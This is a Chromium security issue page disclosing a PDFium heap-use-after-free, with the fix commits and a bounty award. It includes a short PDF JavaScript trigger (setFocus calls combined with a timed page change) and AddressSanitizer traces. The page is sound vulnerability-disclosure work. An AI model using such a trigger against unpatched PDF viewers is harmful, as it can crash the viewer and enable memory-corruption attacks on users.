# Security: Heap-use-after-free in CPDFSDK_Document::RemovePageView

| Field | Value |
|-------|-------|
| **Issue ID** | [40085575](https://issues.chromium.org/issues/40085575) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ds...@chromium.org |
| **Created** | 2016-10-02 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**

<https://crbug.com/chromium/630654> can be reproduced again in a slightly different way.  

I think the reason is that a fix given for that bug is modified to fix <https://crbug.com/chromium/645122> in below mentioned change set.

<https://pdfium.googlesource.com/pdfium/+/c2d0e29cd8fa24c9af0cc4f2a15f90096a5ca8e2>

Attached testcase.pdf file has below mentioned Javascript.

## Lose Focus Action of "txt1" text field

this.getField('txt2').setFocus();

## Document Javascript Section

function test() {  

this.getField('txt1').setFocus();  

this.pageNum = 2;  

}

app.setTimeOut("test()",3000);

**VERSION**  

Chrome Version: [55.0.2879.0] + [TOT]  

Operating System: [Ubuntu 16.04]

**REPRODUCTION CASE**

1. Open attached testcase.pdf file with chrome built with Address Sanitizer.
2. Wait 3 seconds.  
   
   PDF Plugin process will crash.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [PDF Plugin process]  

Crash State: [Address Sanitizer Output]

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x6040000270d8 at pc 0x55c6876942c5 bp 0x7ffda3d9eb40 sp 0x7ffda3d9eb38  

READ of size 8 at 0x6040000270d8 thread T0 (chrome)  

#0 0x55c6876942c4 in \_\_tree\_next<std::\_\_1::\_\_tree\_node\_base<void \*> \*> ./out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:149:14  

#1 0x55c6876942c4 in operator++ ./out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:647:0  

#2 0x55c6876942c4 in erase ./out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:1967:0  

#3 0x55c6876942c4 in erase ./out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1235:0  

#4 0x55c6876942c4 in RemovePageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:150:0  

#5 0x55c67d30d8b2 in Unload ./out/asan/../../pdf/pdfium/pdfium\_page.cc:112:7  

#6 0x55c67d2e197a in CalculateVisiblePages ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2650:20  

#7 0x55c67d2e2394 in ScrolledToYPosition ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:895:3  

#8 0x55c67d3297b0 in HandleMessage ./out/asan/../../pdf/out\_of\_process\_instance.cc:410:14  

#9 0x55c67d2ae6bd in Messaging\_HandleMessage ./out/asan/../../ppapi/cpp/module.cc:141:13  

.........

0x6040000270d8 is located 8 bytes inside of 48-byte region [0x6040000270d0,0x604000027100)  

freed by thread T0 (chrome) here:  

#0 0x55c678910c5b in operator delete(void\*) ??:?  

#1 0x55c68769424d in \_\_deallocate ./out/asan/../../buildtools/third\_party/libc++/trunk/include/new:176:3  

#2 0x55c68769424d in deallocate ./out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1731:0  

#3 0x55c68769424d in deallocate ./out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1496:0  

#4 0x55c68769424d in erase ./out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:1975:0  

#5 0x55c68769424d in erase ./out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1235:0  

#6 0x55c68769424d in RemovePageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:150:0  

#7 0x55c67d30d8b2 in Unload ./out/asan/../../pdf/pdfium/pdfium\_page.cc:112:7  

#8 0x55c67d2e197a in CalculateVisiblePages ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2650:20  

#9 0x55c67d2fb6dd in GetMostVisiblePage ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2290:3  

#10 0x55c67d2de254 in Form\_GetCurrentPage ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:3502:21  

#11 0x55c687b409ca in setFocus ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/Field.cpp:3207:15  

#12 0x55c687b5db93 in JSMethod<Field, &Field::setFocus> ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/JS\_Define.h:155:8  

#13 0x55c679433fb2 in Call ./out/asan/../../v8/src/api-arguments.cc:19:3  

#14 0x55c6795ac128 in HandleApiCallHelper<false> ./out/asan/../../v8/src/builtins/builtins-api.cc:106:36  

#15 0x55c6795a98be in Builtin\_Impl\_HandleApiCall ./out/asan/../../v8/src/builtins/builtins-api.cc:135:5  

#11 0x7f87ff7843a6 (<unknown module>)  

#12 0x7f87ff884c41 (<unknown module>)  

#13 0x7f87ff7d06c2 (<unknown module>)  

#14 0x7f87ff7ac2a0 (<unknown module>)  

#16 0x55c679e9c6ea in Invoke ./out/asan/../../v8/src/execution.cc:139:13  

#17 0x55c679e9be92 in Call ./out/asan/../../v8/src/execution.cc:176:10  

#18 0x55c67944c6db in Run ./out/asan/../../v8/src/api.cc:1865:7  

#19 0x55c687ba37ca in Execute ./out/asan/../../third\_party/pdfium/fxjs/fxjs\_v8.cpp:477:25  

#20 0x55c687ad266c in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/cjs\_runtime.cpp:241:14  

#21 0x55c687b9e29a in RunScript ./out/asan/../../third\_party/pdfium/fpdfsdk/javascript/cjs\_context.cpp:52:24  

#22 0x55c687690627 in ?? ./out/asan/../../third\_party/pdfium/fpdfsdk/fsdk\_actionhandler.cpp:522:28  

#23 0x55c6876914bd in ExecuteFieldAction ./out/asan/../../third\_party/pdfium/fpdfsdk/fsdk\_actionhandler.cpp:249:9  

#24 0x55c687691140 in DoAction\_Field ./out/asan/../../third\_party/pdfium/fpdfsdk/fsdk\_actionhandler.cpp:105:10  

#25 0x55c6876b7ba1 in OnAAction ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_widget.cpp:1894:28  

#26 0x55c6876f764a in OnKillFocus ./out/asan/../../third\_party/pdfium/fpdfsdk/formfiller/cffl\_interactiveformfiller.cpp:461:18  

#27 0x55c687694a6c in KillFocusAnnot ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:229:24  

#28 0x55c687694159 in RemovePageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:146:14  

#29 0x55c67d30d8b2 in Unload ./out/asan/../../pdf/pdfium/pdfium\_page.cc:112:7  

#30 0x55c67d2e197a in CalculateVisiblePages ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2650:20

previously allocated by thread T0 (chrome) here:  

#0 0x55c67891001b in operator new(unsigned long) ??:?  

#1 0x55c6876934fc in \_\_allocate ./out/asan/../../buildtools/third\_party/libc++/trunk/include/new:168:10  

#2 0x55c6876934fc in allocate ./out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1729:0  

#3 0x55c6876934fc in allocate ./out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1488:0  

#4 0x55c6876934fc in \_\_construct\_node\_with\_key ./out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1524:0  

#5 0x55c6876934fc in operator[] ./out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1541:0  

#6 0x55c687693200 in GetPageView ./out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_document.cpp:60:3  

#7 0x55c6876867d3 in FormHandleToPageView ./out/asan/../../third\_party/pdfium/fpdfsdk/fpdfformfill.cpp:56:29  

#8 0x55c6876867d3 in FORM\_OnAfterLoadPage ./out/asan/../../third\_party/pdfium/fpdfsdk/fpdfformfill.cpp:649:0  

#9 0x55c67d30db02 in GetPage ./out/asan/../../pdf/pdfium/pdfium\_page.cc:127:7  

#10 0x55c67d2e8f91 in FinishLoadingDocument ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:1120:54  

#11 0x55c67d2fe4ba in ContinueLoadingDocument ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2563:5  

#12 0x55c67d2e764f in LoadDocument ./out/asan/../../pdf/pdfium/pdfium\_engine.cc:2452:5  

.................

## Attachments

- [testcase.pdf](attachments/testcase.pdf) (application/pdf, 3.4 KB)

## Timeline

### ke...@chromium.org (2016-10-03)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### ke...@chromium.org (2016-10-03)

[Empty comment from Monorail migration]

### ds...@chromium.org (2016-10-03)

https://codereview.chromium.org/2384243002/

### bu...@chromium.org (2016-10-03)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium.git/+/bcf46238b4533a9da91f4fa5d7248bbc85511dbd

commit bcf46238b4533a9da91f4fa5d7248bbc85511dbd
Author: dsinclair <dsinclair@chromium.org>
Date: Mon Oct 03 20:02:27 2016

Guard against double deletion of page views.

This CL adds a |IsBeingDestroyed| flag into the CPDFSDK_PageView. We then
bail out of the pageview removal code early if the flag is set.

BUG=chromium:652103

Review-Url: https://codereview.chromium.org/2384243002

[modify] https://crrev.com/bcf46238b4533a9da91f4fa5d7248bbc85511dbd/fpdfsdk/cpdfsdk_document.cpp
[modify] https://crrev.com/bcf46238b4533a9da91f4fa5d7248bbc85511dbd/fpdfsdk/cpdfsdk_pageview.cpp
[modify] https://crrev.com/bcf46238b4533a9da91f4fa5d7248bbc85511dbd/fpdfsdk/cpdfsdk_pageview.h
[modify] https://crrev.com/bcf46238b4533a9da91f4fa5d7248bbc85511dbd/fpdfsdk/fpdfview.cpp


### ds...@chromium.org (2016-10-03)

Thanks again. Hopefully this fixes it for the final time.

### bu...@chromium.org (2016-10-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0fa26ad94fd19078497d0e5626696b6f041b15b1

commit 0fa26ad94fd19078497d0e5626696b6f041b15b1
Author: pdfium-deps-roller <pdfium-deps-roller@chromium.org>
Date: Mon Oct 03 22:39:18 2016

Roll src/third_party/pdfium/ d61f95838..76383db49 (3 commits).

https://pdfium.googlesource.com/pdfium.git/+log/d61f958385be..76383db4906c

$ git log d61f95838..76383db49 --date=short --no-merges --format='%ad %ae %s'
2016-10-03 dsinclair Fix potentially uninitialized value.
2016-10-03 tsepez Rename CFX_WeakPtr::Clear() to DestroyObject()
2016-10-03 dsinclair Guard against double deletion of page views.

BUG=651632,652103

TBR=dsinclair@chromium.org

Review-Url: https://codereview.chromium.org/2388133003
Cr-Commit-Position: refs/heads/master@{#422572}

[modify] https://crrev.com/0fa26ad94fd19078497d0e5626696b6f041b15b1/DEPS


### sh...@chromium.org (2016-10-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-12)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

And another $3,000 for this one!

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-10)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-01-10)

This issue was migrated from crbug.com/chromium/652103?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085575)*
